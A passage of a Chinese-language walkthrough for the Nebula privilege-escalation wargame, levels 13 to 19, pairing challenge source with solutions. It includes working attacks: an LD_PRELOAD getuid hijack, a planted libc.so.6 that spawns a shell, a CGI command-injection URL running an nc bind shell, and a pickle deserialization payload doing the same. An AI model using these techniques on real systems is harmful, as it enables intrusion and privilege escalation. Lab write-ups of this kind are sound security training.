      <span style=color:#66d9ef>end</span>

  <span style=color:#66d9ef>end</span>

  client:close()
<span style=color:#66d9ef>end</span>
</code></pre></div><p>存在很明显的命令注入：</p><p><img src=level12_1.png alt=Level12></p><h2 id=level13>Level13</h2><p>题目源码：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/types.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#75715e>#define FAKEUID 1000
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>envp)
{
  <span style=color:#66d9ef>int</span> c;
  <span style=color:#66d9ef>char</span> token[<span style=color:#ae81ff>256</span>];

  <span style=color:#66d9ef>if</span>(getuid() <span style=color:#f92672>!=</span> FAKEUID) {
      printf(<span style=color:#e6db74>&#34;Security failure detected. UID %d started us, we expect %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, getuid(), FAKEUID);
      printf(<span style=color:#e6db74>&#34;The system administrators will be notified of this violation</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
      exit(EXIT_FAILURE);
  }

  <span style=color:#75715e>// snip, sorry :)
</span><span style=color:#75715e></span>
  printf(<span style=color:#e6db74>&#34;your token is %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, token);
  
}
</code></pre></div><p>查看flag14程序的重定位表，可以发现<code>getuid()</code>函数：</p><p><img src=level13_2.png alt></p><p>这道题目是为了exploit<code>getuid()</code>函数，我们可以通过<code>LD_PRELOAD</code>预先加载我们自己的链接文件，劫持原本的<code>getuid()</code>函数。</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>getuid</span>()
{
	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1000</span>;
}
</code></pre></div><p>将它编译为动态链接文件，并执行：</p><pre><code>$ gcc -shared -o getuid.so getuid.c

$ LD_PRELOAD=~/getuid.so /home/flag13/flag13
</code></pre><p>执行发现没有效果，发现<strong>LD_PRELOAD要生效，所执行的程序的owner必须是该用户</strong>，所以将flag13文件copy一下即可：</p><p><img src=level13_1.png alt=Level13></p><h2 id=level14>Level14</h2><p>此题略微试探一下即可发现其加密逻辑：从第0个字符开始，每个字符的ascii对应加1即为密文。直接编写脚本解密：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python</span>

plain <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>

<span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;/home/flag14/token&#39;</span>, <span style=color:#e6db74>&#39;r&#39;</span>):
    cipher <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read()[:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]
    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(len(cipher)):
        plain <span style=color:#f92672>+=</span> chr(ord(cipher[i]) <span style=color:#f92672>-</span> i)

<span style=color:#66d9ef>print</span> plain
</code></pre></div><h2 id=level15>Level15</h2><p>按照题目提示，<code>strace</code>来监控flag15程序的系统调用，在输出中发现：</p><pre><code>open(&quot;/var/tmp/flag15/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
</code></pre><p>程序试图打开一个不存在的文件，观察文件名像是动态链接文件，查看flag15的相关信息：</p><pre><code>$ readelf -d flag15

Dynamic section at offset 0xf20 contains 21 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]
 ......
</code></pre><p>可以发现有<code>RPATH</code>变量值为<code>/var/tmp/flag15</code>，查看<code>man dlopen</code>可以发现<code>RPATH</code>在连接器寻找目录的首位，因此我们可以构造自己的<code>libc.so.6</code>动态链接文件放在<code>/var/tmp/flag15</code>目录下。动态链接文件载入时会首先执行<code>_init</code>函数，因此我们可以重写此函数来达到目的。（重写<code>__libc_start_main</code>函数也可以）</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>__attribute__((constructor)) <span style=color:#66d9ef>void</span> __myinit(<span style=color:#66d9ef>void</span>) {
	setresuid(<span style=color:#ae81ff>984</span>, <span style=color:#ae81ff>984</span>, <span style=color:#ae81ff>984</span>);
	system(<span style=color:#e6db74>&#34;/bin/bash&#34;</span>);
}
</code></pre></div><p>采用如下指令编译：</p><pre><code>gcc -shared -fPIC -o libc.so.6 libc1.c
</code></pre><p>运行flag15后发现提示：</p><blockquote><p>/var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)</p></blockquote><p>查阅资料，需要编写一version文件，在链接时加入版本信息：</p><pre><code>$ cat ver
GLIBC_2.0 {};
$ gcc -shared -fPIC -o libc.so.6 -Wl,--version-script,ver libc1.c
</code></pre><p>运行flag15后又现提示：</p><blockquote><p>/var/tmp/flag15/libc.so.6: version `GLIBC_2.1.3&rsquo; not found (required by /var/tmp/flag15/libc.so.6)</p></blockquote><p>经查阅资料后，发现原因可能为我们自己编写<code>libc.so.6</code>覆盖了原本的<code>libc.so.6</code>，它仅会加载一次；而我们自己编写的<code>libc.so.6</code>要用到本来的<code>libc.so.6</code>的函数，所以在运行的时候会提示找不到。解决方法是在编译<code>libc.so.6</code>的时候采用静态链接的方法。</p><pre><code>gcc -shared -fPIC -o libc.so.6 -static-libgcc -Wl,--version-script,ver,-Bstatic libc1.c
</code></pre><p>之后即可正确运行flag15程序，拿到shell。</p><h2 id=level16>Level16</h2><p>题目源码：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-perl data-lang=perl><span style=color:#75715e>#!/usr/bin/env perl</span>

<span style=color:#66d9ef>use</span> CGI <span style=color:#e6db74>qw{param}</span>;

<span style=color:#66d9ef>print</span> <span style=color:#e6db74>&#34;Content-type: text/html\n\n&#34;</span>;

<span style=color:#66d9ef>sub</span> <span style=color:#a6e22e>login</span> {
  $username <span style=color:#f92672>=</span> $_[<span style=color:#ae81ff>0</span>];
  $password <span style=color:#f92672>=</span> $_[<span style=color:#ae81ff>1</span>];

  $username <span style=color:#f92672>=~</span> tr<span style=color:#e6db74>/a-z/</span>A<span style=color:#f92672>-</span>Z<span style=color:#f92672>/</span>; <span style=color:#75715e># conver to uppercase</span>
  $username <span style=color:#f92672>=~</span> <span style=color:#e6db74>s/\s.*//</span>;        <span style=color:#75715e># strip everything after a space</span>

  @output <span style=color:#f92672>=</span> <span style=color:#e6db74>`egrep &#34;^$username&#34; /home/flag16/userdb.txt 2&gt;&amp;1`</span>;
  <span style=color:#66d9ef>foreach</span> $line (@output) {
      ($usr, $pw) <span style=color:#f92672>=</span> split(<span style=color:#e6db74>/:/</span>, $line);
  

      <span style=color:#66d9ef>if</span>($pw <span style=color:#f92672>=~</span> $password) {
          <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>;
      }
  }

  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
}

<span style=color:#66d9ef>sub</span> <span style=color:#a6e22e>htmlz</span> {
  <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#34;&lt;html&gt;&lt;head&gt;&lt;title&gt;Login resuls&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&#34;</span>);
  <span style=color:#66d9ef>if</span>($_[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>) {
      <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#34;Your login was accepted&lt;br/&gt;&#34;</span>);
  } <span style=color:#66d9ef>else</span> {
      <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#34;Your login failed&lt;br/&gt;&#34;</span>);
  }    
  <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#34;Would you like a cookie?&lt;br/&gt;&lt;br/&gt;&lt;/body&gt;&lt;/html&gt;\n&#34;</span>);
}

htmlz(login(param(<span style=color:#e6db74>&#34;username&#34;</span>), param(<span style=color:#e6db74>&#34;password&#34;</span>)));
</code></pre></div><p>由源码可以看出，此题应该是<strong>命令注入</strong>，但对输入的变量做了限制：</p><ul><li>将所有的小写字母转化为大写字母</li><li>将空白字符及其后面的字符全部删掉</li></ul><p>一般的命令都要求输入参数，这就要用空格隔开，因此不能直接注入命令，考虑将命令写入脚本，然后执行；但是并没有对根目录的写入权限，而根目录下的所有文件夹都是小写，所以就需要考虑一种绕过方法。</p><p>将如下脚本写入<code>/tmp/SHELL</code>：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#75715e>#!/bin/bash
</span><span style=color:#75715e></span>nc.traditional -nlp <span style=color:#ae81ff>9999</span> -e /bin/bash
</code></pre></div><p>然后可以用<code>/*/SHELL</code>来访问到它，这就绕过了大写转换。给此脚本增加执行权限，然后访问：</p><pre><code>http://your-ip:1616/index.cgi?username=$(/*/SHELL)
</code></pre><p>然后直接连接nc所监听端口，获取shell。</p><p>ps. 另一种绕过方法是利用shell自身的<a href=http://wiki.bash-hackers.org/syntax/pe#case_modification>case modification</a>，先定义一变量，然后在引用该变量的时候利用<code>${var,,}</code>来将大写字母转化为小写。</p><h2 id=level17>Level17</h2><p>题目源码：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python</span>

<span style=color:#f92672>import</span> os
<span style=color:#f92672>import</span> pickle
<span style=color:#f92672>import</span> time
<span style=color:#f92672>import</span> socket
<span style=color:#f92672>import</span> signal

signal<span style=color:#f92672>.</span>signal(signal<span style=color:#f92672>.</span>SIGCHLD, signal<span style=color:#f92672>.</span>SIG_IGN)

<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>server</span>(skt):
  line <span style=color:#f92672>=</span> skt<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>1024</span>)

  obj <span style=color:#f92672>=</span> pickle<span style=color:#f92672>.</span>loads(line)

  <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> obj:
      clnt<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#34;why did you send me &#34;</span> <span style=color:#f92672>+</span> i <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;?</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)

skt <span style=color:#f92672>=</span> socket<span style=color:#f92672>.</span>socket(socket<span style=color:#f92672>.</span>AF_INET, socket<span style=color:#f92672>.</span>SOCK_STREAM, <span style=color:#ae81ff>0</span>)
skt<span style=color:#f92672>.</span>bind((<span style=color:#e6db74>&#39;0.0.0.0&#39;</span>, <span style=color:#ae81ff>10007</span>))
skt<span style=color:#f92672>.</span>listen(<span style=color:#ae81ff>10</span>)

<span style=color:#66d9ef>while</span> True:
  clnt, addr <span style=color:#f92672>=</span> skt<span style=color:#f92672>.</span>accept()

  <span style=color:#66d9ef>if</span>(os<span style=color:#f92672>.</span>fork() <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>):
      clnt<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#34;Accepted connection from </span><span style=color:#e6db74>%s</span><span style=color:#e6db74>:</span><span style=color:#e6db74>%d</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> (addr[<span style=color:#ae81ff>0</span>], addr[<span style=color:#ae81ff>1</span>]))
      server(clnt)
      exit(<span style=color:#ae81ff>1</span>)
</code></pre></div><h3 id=python的pickle库反序列化漏洞>python的pickle库反序列化漏洞</h3><p>此题是python的pickle序列化库的特性，它可能会导致反序列化漏洞。</p><p>pickle库能序列化大多数对象，包括用户自定义的类。它的序列化函数有两个：</p><ul><li><code>pickle.load(obj, file, protocol=None, *, fix_imports=True)</code>：该方法将obj对象序列化为字节（bytes）输出到file文件中。</li><li><code>pickle.loads(obj, protocol=None, *, fix_imports=True)</code>：该方法将obj对象序列化并返回一个bytes对象。</li></ul><p>反序列化函数对应也有两个：</p><ul><li><code>pickle.load(file, *, fix_imports=True, encoding="ASCII", errors="strict")</code>：从一个对象文件中读取序列化数据，将其反序列化之后返回一个对象。</li><li><code>pickle.loads(bytes_object, *, fix_imports=True, encoding="ASCII", errors="strict")</code>：将一个bytes对象反序列化并返回一个对象。</li></ul><p>对于一个类来说，其<code>__reduce__()</code>方法在反序列化时是会被执行的，这个方法返回一个字符串或者元组来描述当反序列化的时候该如何重构。</p><h3 id=payload>payload</h3><p>所以我们就可以利用<code>__reduce__()</code>方法来get shell。编写python脚本：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python</span>
<span style=color:#75715e>#coding=utf-8</span>

<span style=color:#f92672>import</span> pickle
<span style=color:#f92672>import</span> os

<span style=color:#66d9ef>class</span> <span style=color:#a6e22e>poc</span>(object):
	<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__reduce__</span>(self):
		s <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;nc.traditional -nlp 9999 -e /bin/bash&#34;</span>
		<span style=color:#75715e>#s = &#39;echo abcdefg&#39;</span>
		<span style=color:#66d9ef>return</span> os<span style=color:#f92672>.</span>system, (s,)

e <span style=color:#f92672>=</span> poc()
s <span style=color:#f92672>=</span> pickle<span style=color:#f92672>.</span>dumps(e)
<span style=color:#66d9ef>print</span> s
</code></pre></div><p>运行然后连接nc端口：</p><p><img src=level17_1.png alt=Level17></p><h2 id=level18>Level18</h2><p>题目源码：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/types.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;fcntl.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;getopt.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>struct</span> {
  FILE <span style=color:#f92672>*</span>debugfile;
  <span style=color:#66d9ef>int</span> verbose;
  <span style=color:#66d9ef>int</span> loggedin;
} globals;

<span style=color:#75715e>#define dprintf(...) if(globals.debugfile) \
</span><span style=color:#75715e>  fprintf(globals.debugfile, __VA_ARGS__)
</span><span style=color:#75715e>#define dvprintf(num, ...) if(globals.debugfile &amp;&amp; globals.verbose &gt;= num) \
</span><span style=color:#75715e>  fprintf(globals.debugfile, __VA_ARGS__)
</span><span style=color:#75715e></span>
<span style=color:#75715e>#define PWFILE &#34;/home/flag18/password&#34;
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>void</span> <span style=color:#a6e22e>login</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>pw)
{
  FILE <span style=color:#f92672>*</span>fp;

  fp <span style=color:#f92672>=</span> fopen(PWFILE, <span style=color:#e6db74>&#34;r&#34;</span>);
  <span style=color:#66d9ef>if</span>(fp) {
      <span style=color:#66d9ef>char</span> file[<span style=color:#ae81ff>64</span>];

      <span style=color:#66d9ef>if</span>(fgets(file, <span style=color:#66d9ef>sizeof</span>(file) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>, fp) <span style=color:#f92672>==</span> NULL) {
          dprintf(<span style=color:#e6db74>&#34;Unable to read password file %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, PWFILE);
          <span style=color:#66d9ef>return</span>;
      }
                fclose(fp);
      <span style=color:#66d9ef>if</span>(strcmp(pw, file) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) <span style=color:#66d9ef>return</span>;       
  }
  dprintf(<span style=color:#e6db74>&#34;logged in successfully (with%s password file)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,
      fp <span style=color:#f92672>==</span> NULL <span style=color:#f92672>?</span> <span style=color:#e6db74>&#34;out&#34;</span> <span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;&#34;</span>);
  
  globals.loggedin <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;

}

<span style=color:#66d9ef>void</span> <span style=color:#a6e22e>notsupported</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>what)
{
  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>buffer <span style=color:#f92672>=</span> NULL;
  asprintf(<span style=color:#f92672>&amp;</span>buffer, <span style=color:#e6db74>&#34;--&gt; [%s] is unsupported at this current time.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, what);
  dprintf(what);
  free(buffer);
}

<span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setuser</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>user)
{
  <span style=color:#66d9ef>char</span> msg[<span style=color:#ae81ff>128</span>];

  sprintf(msg, <span style=color:#e6db74>&#34;unable to set user to &#39;%s&#39; -- not supported.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, user);
  printf(<span style=color:#e6db74>&#34;%s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, msg);

}

<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>envp)
{
  <span style=color:#66d9ef>char</span> c;

  <span style=color:#66d9ef>while</span>((c <span style=color:#f92672>=</span> getopt(argc, argv, <span style=color:#e6db74>&#34;d:v&#34;</span>)) <span style=color:#f92672>!=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
      <span style=color:#66d9ef>switch</span>(c) {
          <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;d&#39;</span><span style=color:#f92672>:</span>
              globals.debugfile <span style=color:#f92672>=</span> fopen(optarg, <span style=color:#e6db74>&#34;w+&#34;</span>);
              <span style=color:#66d9ef>if</span>(globals.debugfile <span style=color:#f92672>==</span> NULL) err(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;Unable to open %s&#34;</span>, optarg);
              setvbuf(globals.debugfile, NULL, _IONBF, <span style=color:#ae81ff>0</span>);
              <span style=color:#66d9ef>break</span>;
          <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;v&#39;</span><span style=color:#f92672>:</span>
              globals.verbose<span style=color:#f92672>++</span>;
              <span style=color:#66d9ef>break</span>;
      }
  }

  dprintf(<span style=color:#e6db74>&#34;Starting up. Verbose level = %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, globals.verbose);

  setresgid(getegid(), getegid(), getegid());
  setresuid(geteuid(), geteuid(), geteuid());
  
  <span style=color:#66d9ef>while</span>(<span style=color:#ae81ff>1</span>) {
      <span style=color:#66d9ef>char</span> line[<span style=color:#ae81ff>256</span>];
      <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>p, <span style=color:#f92672>*</span>q;

      q <span style=color:#f92672>=</span> fgets(line, <span style=color:#66d9ef>sizeof</span>(line)<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, stdin);
      <span style=color:#66d9ef>if</span>(q <span style=color:#f92672>==</span> NULL) <span style=color:#66d9ef>break</span>;
      p <span style=color:#f92672>=</span> strchr(line, <span style=color:#e6db74>&#39;\n&#39;</span>); <span style=color:#66d9ef>if</span>(p) <span style=color:#f92672>*</span>p <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
      p <span style=color:#f92672>=</span> strchr(line, <span style=color:#e6db74>&#39;\r&#39;</span>); <span style=color:#66d9ef>if</span>(p) <span style=color:#f92672>*</span>p <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;

      dvprintf(<span style=color:#ae81ff>2</span>, <span style=color:#e6db74>&#34;got [%s] as input</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, line);

      <span style=color:#66d9ef>if</span>(strncmp(line, <span style=color:#e6db74>&#34;login&#34;</span>, <span style=color:#ae81ff>5</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
          dvprintf(<span style=color:#ae81ff>3</span>, <span style=color:#e6db74>&#34;attempting to login</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
          login(line <span style=color:#f92672>+</span> <span style=color:#ae81ff>6</span>);
      } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>(strncmp(line, <span style=color:#e6db74>&#34;logout&#34;</span>, <span style=color:#ae81ff>6</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
          globals.loggedin <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
      } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>(strncmp(line, <span style=color:#e6db74>&#34;shell&#34;</span>, <span style=color:#ae81ff>5</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
          dvprintf(<span style=color:#ae81ff>3</span>, <span style=color:#e6db74>&#34;attempting to start shell</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
          <span style=color:#66d9ef>if</span>(globals.loggedin) {
              execve(<span style=color:#e6db74>&#34;/bin/sh&#34;</span>, argv, envp);
              err(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;unable to execve&#34;</span>);
          }
          dprintf(<span style=color:#e6db74>&#34;Permission denied</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
      } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>(strncmp(line, <span style=color:#e6db74>&#34;logout&#34;</span>, <span style=color:#ae81ff>4</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
          globals.loggedin <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
      } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>(strncmp(line, <span style=color:#e6db74>&#34;closelog&#34;</span>, <span style=color:#ae81ff>8</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
          <span style=color:#66d9ef>if</span>(globals.debugfile) fclose(globals.debugfile);
          globals.debugfile <span style=color:#f92672>=</span> NULL;
      } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>(strncmp(line, <span style=color:#e6db74>&#34;site exec&#34;</span>, <span style=color:#ae81ff>9</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
          notsupported(line <span style=color:#f92672>+</span> <span style=color:#ae81ff>10</span>);
      } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>(strncmp(line, <span style=color:#e6db74>&#34;setuser&#34;</span>, <span style=color:#ae81ff>7</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
          setuser(line <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span>);
      }
  }

  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
}
</code></pre></div><p>题目指出此题共有三种解法，可以发现<code>notsupported()</code>函数中的<code>dprintf()</code>应该存在<strong>格式化字符串漏洞</strong>，而<code>setuser()</code>函数中应该存在栈溢出漏洞，这可能是该题目的可能解法，但该程序有一定的保护机制，目前超出能力范围。</p><p>所以还是关注另一个程序漏洞。由代码可以看出，只要能成功登录，即可拿到shell，查看<code>login()</code>函数，可以发现只要能让<code>password</code>文件打开失败，即可无密码登录。</p><p>那么如何使<code>fopen()</code>执行失败呢？可以利用系统对shell资源的访问限制来实现，系统是限制了用户或进程的资源使用的，其中就有<strong>可以打开最大文件描述符的数量</strong>。可以通过<code>ulimit -a</code>来查看相关的资源限制：</p><p><img src=level18_3.png alt=系统资源使用限制></p><p>其中可以看到<code>open files (-n) 1024</code>，所以目前单个进程可打开文件描述符的最大数量为1024，这个数值可以通过<code>ulimit -n number</code>设置。其中每个进程都默认打开<code>stdin</code>, <code>stdout</code>, <code>stderr</code>三个文件描述符，因此我们设置<code>ulimit -n 4</code>。</p><p>设置为4是为了还能打开程序（设置为3时，无法运行程序），并且还可以利用flag18程序的<code>-d</code>参数查看输出信息。此外我们直接设置<code>-d /dev/tty</code>来将输出的debug信息输出到屏幕上。</p><p>所以在设置了<code>-d</code>参数的情况下，打开flag18程序时，即打开了四个文件，可以直接login：</p><p><img src=level18_0.png alt></p><p>可以看到登录成功，但是在运行<code>/bin/sh</code>的时候无法打开链接库，那么登录成功后就可以利用<code>closelog</code>来关闭一个文件：</p><p><img src=level18_1.png alt></p><p>又出现了问题，由于运行<code>/bin/sh</code>的时候将程序的参数也都传递了过去，因此<code>/bin/sh</code>程序报错。为了解决这个问题，我们可以在运行flag18程序的时候在最前面加上<code>--rcfile</code>的参数，这是一个bash的参数，用来自定义<code>bashrc</code>文件，此参数后跟着的内容即使是不存在的文件也不会报错。所以在执行<code>/bin/sh</code>的时候，<code>-d</code>会被当成一个无效的<code>bashrc</code>文件被忽略，而<code>/dev/tty</code>则会被当作bash执行的源文件，这样恰好我们可以实现一个交互式的shell，bash会直接从终端读取输入并执行。（不然<code>/dev/tty</code>处换成其它文本文件的话，就要将要执行的命令先行写入该文件。）</p><p><img src=level18_2.png alt=Level18></p><h2 id=level19>Level19</h2><p>题目源码：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/types.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;fcntl.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/stat.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>envp)
{
  pid_t pid;
  <span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>256</span>];
  <span style=color:#66d9ef>struct</span> stat statbuf;

  <span style=color:#75715e>/* Get the parent&#39;s /proc entry, so we can verify its user id */</span>

  snprintf(buf, <span style=color:#66d9ef>sizeof</span>(buf)<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;/proc/%d&#34;</span>, getppid());

  <span style=color:#75715e>/* stat() it */</span>

  <span style=color:#66d9ef>if</span>(stat(buf, <span style=color:#f92672>&amp;</span>statbuf) <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
      printf(<span style=color:#e6db74>&#34;Unable to check parent process</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
      exit(EXIT_FAILURE);
  }

  <span style=color:#75715e>/* check the owner id */</span>

  <span style=color:#66d9ef>if</span>(statbuf.st_uid <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
      <span style=color:#75715e>/* If root started us, it is ok to start the shell */</span>

      execve(<span style=color:#e6db74>&#34;/bin/sh&#34;</span>, argv, envp);
      err(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;Unable to execve&#34;</span>);
  }

  printf(<span style=color:#e6db74>&#34;You are unauthorized to run this program</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
}
